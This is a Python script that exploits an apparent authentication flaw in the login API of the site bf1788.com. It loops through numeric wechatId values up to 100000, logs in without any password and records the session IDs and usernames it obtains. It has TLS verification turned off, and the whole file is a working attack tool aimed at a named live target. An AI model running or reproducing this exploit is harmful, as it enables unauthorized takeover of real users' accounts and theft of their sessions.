#!/usr/bin/env python3
"""
bf1788.com WechatLogin — Numeric wechatId Scanner
=================================================
Scans for accounts with numeric wechatId (1, 2, 3, ... 100000)

Usage:
  python scan_numeric_wechatid.py [--start N] [--end N] [--delay S]

Results saved to:
  found_wechatids.txt      - Valid wechatIds found
  numeric_enum_results.json - Full JSON results
"""
import requests, urllib3, time, json, argparse
urllib3.disable_warnings()

TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

def wechat_login(wechatId):
    """Attempt login with wechatId only (no password/OAuth)."""
    params = {"cmd": "1000", "wechatId": wechatId, "sid": "", **BASE_PARAMS}
    try:
        resp = requests.post(TARGET, data=params, timeout=15, verify=False)
        data = resp.json()
        if str(data.get("status")) == "0":
            msg = data.get("msg", {})
            sid = msg.get("sid") if isinstance(msg, dict) else None
            username = msg.get("username") if isinstance(msg, dict) else None
            if sid:
                return sid, username
    except Exception as e:
        pass
    return None, None

def main():
    parser = argparse.ArgumentParser(description="bf1788.com numeric wechatId scanner")
    parser.add_argument("--start", type=int, default=1, help="Start number (default: 1)")
    parser.add_argument("--end", type=int, default=100000, help="End number (default: 100000)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests (default: 0.1)")
    parser.add_argument("--format", choices=["plain", "zero5", "zero6"], default="plain",
                        help="wechatId format: plain(1), zero5(00001), zero6(000001)")
    parser.add_argument("--save-dir", default=".", help="Output directory for results")
    args = parser.parse_args()

    found = []
    save_dir = args.save_dir
    import os
    os.makedirs(save_dir, exist_ok=True)

    if args.format == "zero5":
        wechatId_func = lambda i: f"{i:05d}"
    elif args.format == "zero6":
        wechatId_func = lambda i: f"{i:06d}"
    else:
        wechatId_func = lambda i: str(i)

    print(f"[*] Target: {TARGET}")
    print(f"[*] Scanning wechatId {args.start} to {args.end} (format: {args.format})")
    print(f"[*] Results will be saved to: {save_dir}")
    print(f"[*] Starting scan...\n")

    for i in range(args.start, args.end + 1):
        wechatId = wechatId_func(i)
        sid, username = wechat_login(wechatId)

        if sid:
            result = {"wechatId": wechatId, "sid": sid, "username": username, "number": i}
            found.append(result)
            print(f"[+] FOUND! wechatId={wechatId} (num={i}), sid={sid}, username={username}")

            # Save immediately
            with open(f"{save_dir}/found_wechatids.txt", "a") as f:
                f.write(f"{wechatId}|{sid}|{username}\n")

        if i % 1000 == 0:
            print(f"[*] Progress: {i}/{args.end} (found: {len(found)})")

        time.sleep(args.delay)

    # Save full JSON results
    with open(f"{save_dir}/numeric_enum_results.json", "w") as f:
        json.dump({"scan_params": vars(args), "found": found, "total_found": len(found)}, f, indent=2)

    print(f"\n[*] Scan complete!")
    print(f"[*] Total found: {len(found)}")
    print(f"[*] Results saved to: {save_dir}/")

if __name__ == "__main__":
    main()
